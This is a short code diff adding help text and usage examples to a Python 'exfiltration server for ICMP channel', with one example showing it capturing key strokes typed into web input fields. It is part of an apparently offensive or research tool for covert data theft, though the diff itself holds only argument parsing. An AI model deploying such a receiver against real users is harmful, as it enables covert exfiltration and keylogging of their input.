@@ -3,8 +3,17 @@
 import os, socket, argparse, logging
 from channel import ICMP_Channel_Server, Channel_Transport
 
+description = '''Start server to receive exfiltrated messages on localhost:
+\tpython3 server.py -b 127.0.0.1
+Start server to receive key strokes inside any input field:
+\tpython3 server.py freq_en.json -e input -a value'''
+
 # Initialize argument parsing
-parser = argparse.ArgumentParser()
+class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter): pass
+parser = argparse.ArgumentParser(
+    epilog=description,
+    formatter_class=CustomFormatter,
+    description="Exfiltration server for ICMP channel")
 parser.add_argument("-b", "--bind", type=str, default="0.0.0.0", help="Bind to this IP")
 parser.add_argument("-e", "--encoding", type=str, default="utf-8", help="Encoding to use")
 parser.add_argument("-i", "--identifier", type=int, default=1, help="Identifer for ICMP packets shared between client and server (1-65535)")
